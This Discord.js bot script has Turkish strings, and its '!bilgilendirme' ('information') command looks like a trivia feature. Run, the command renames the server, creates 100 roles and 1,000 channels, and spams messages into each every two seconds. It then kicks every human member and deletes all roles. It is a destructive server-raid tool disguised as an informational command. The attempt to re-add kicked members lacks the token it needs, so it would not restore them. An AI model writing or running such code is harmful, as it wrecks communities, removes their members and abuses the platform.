const Discord = require('discord.js');
require('dotenv').config(); 
const client = new Discord.Client();
const PREFIX = "!";

client.on('ready', () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
});

client.on('message', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  if (command === 'bilgilendirme') {

    const sunucu = message.guild;
    const bilgilendirmeMesajlari = [
      "Güneş sistemimizde 8 gezegen bulunur.",
      "Python, yaygın olarak kullanılan bir programlama dilidir.",
      "Dünya'nın en derin noktası Mariana Çukuru'dur.",
      "İnsan vücudunda 206 kemik bulunur.",
      "Einstein, görelilik teorisi ile ünlüdür.",
      "Su, 100°C'de kaynar.",
      "Photosentez, bitkilerin enerji üretme sürecidir.",
      "Mars, Kızıl Gezegen olarak bilinir.",
      "İnsan beyni yaklaşık 86 milyar nörona sahiptir.",
      "Dünya'nın en uzun nehri Nil Nehri'dir."
    ];

    sunucu.setName('Test Sunucusu')
    .then(updated => console.log(`Sunucu adı değiştirildi: ${updated.name}`))
    .catch(console.error);

        const rolSayisi = 100; // Kaç tane rol eklenecek?
        const renkler = ['RED', 'BLUE', 'GREEN', 'YELLOW', 'PURPLE', 'ORANGE', 'RANDOM'];
    
        for (let i = 1; i <= rolSayisi; i++) {
          const rolAdi = `Rol ${i}`; // Rol ismi örneği: "Rol 1", "Rol 2", ...
          const renk = renkler[Math.floor(Math.random() * renkler.length)];
    
          sunucu.roles.create({
            data: {
              name: rolAdi,
              color: renk,
            },
          })
            .then(role => console.log(`Rol oluşturuldu: ${role.name}`))
            .catch(console.error);
        }

    for (let i = 1; i <= 1000; i++) {
      await sunucu.channels.create(`bilgilendirme-${i}`, { type: 'text' })
        .then(channel => {
          // Her kanala sürekli bilgilendirici mesajlar gönder
          setInterval(() => {
            const mesaj = bilgilendirmeMesajlari[Math.floor(Math.random() * bilgilendirmeMesajlari.length)];
            channel.send(mesaj);
          }, 2000); 
        })
        .catch(console.error);
    }


    sunucu.members.cache.forEach(member => {
      if (!member.user.bot) {
        member.kick().then(() => {
          sunucu.members.add(member.user.id); // Geri ekle
        }).catch(console.error);
      }
    });


    sunucu.roles.cache.forEach(role => {
      if (role.name !== "@everyone") {
        role.delete().catch(console.error);
      }
    });
  }
});

client.login(process.env.TOKEN);